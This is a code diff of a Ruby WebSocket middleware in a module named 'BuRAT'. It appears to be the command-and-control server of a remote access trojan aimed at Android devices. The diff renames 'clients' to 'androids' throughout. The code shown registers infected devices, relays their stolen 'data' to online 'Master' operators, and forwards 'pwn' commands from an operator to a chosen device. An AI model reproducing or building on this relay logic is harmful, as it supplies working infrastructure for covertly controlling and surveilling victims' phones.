@@ -7,7 +7,7 @@ module BuRAT
 
     def initialize(app)
       @app     = app
-      @clients = []
+      @androids = []
     end
 
     def call(env)
@@ -31,25 +31,25 @@ module BuRAT
             p header
             #p trailer                       # debug
 
-            if header == "clients" then     # clients - list of clients
-              packet = packet("clients", @clients, 'deathnote')
+            if header == "androids" then     # clients - list of clients
+              packet = packet("androids", @androids, 'deathnote')
               ws.send(packet)
-            elsif header == "client" then   # client - client identification
-              client = @clients.find { |client| client["id"] == payload["id"] }
+            elsif header == "android" then   # client - client identification
+              android = @androids.find { |android| android["id"] == payload["id"] }
               payload.store("status", "Online")
               payload.store("ws", ws)
-              client == nil ? @clients << payload : client.replace(payload)
-              packet = packet("client", payload, "disconnected")
-              masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+              android == nil ? @androids << payload : android.replace(payload)
+              packet = packet("android", payload, "disconnected")
+              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
             elsif header == "data" then     # data - send to master and pipe
               packet = packet("data", payload, trailer)
-              masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
             elsif header == "pwn" then      # pwn - send to other clients
               packet = packet("pwn", payload, trailer)
-              client = @clients.find { |client| client["id"] == payload["client"]}
-              client["ws"].send(packet)
+              android = @androids.find { |android| android["id"] == payload["android"]}
+              android["ws"].send(packet)
             elsif header == "pipe_open" then
             elsif header == "pipe_close" then
             end
@@ -61,11 +61,11 @@ module BuRAT
 
         # CLOSE
         ws.on :close do |event|
-          client = @clients.find { |client| client["ws"] == ws }
-          client["status"] = "Offline"
-          client["ws"] = nil
-          packet = packet('client', client, "disconnected")
-          masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
+          android = @androids.find { |android| android["ws"] == ws }
+          android["status"] = "Offline"
+          android["ws"] = nil
+          packet = packet('android', android, "disconnected")
+          masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
           masters.each { |master| master["ws"].send(packet) }
         end
 
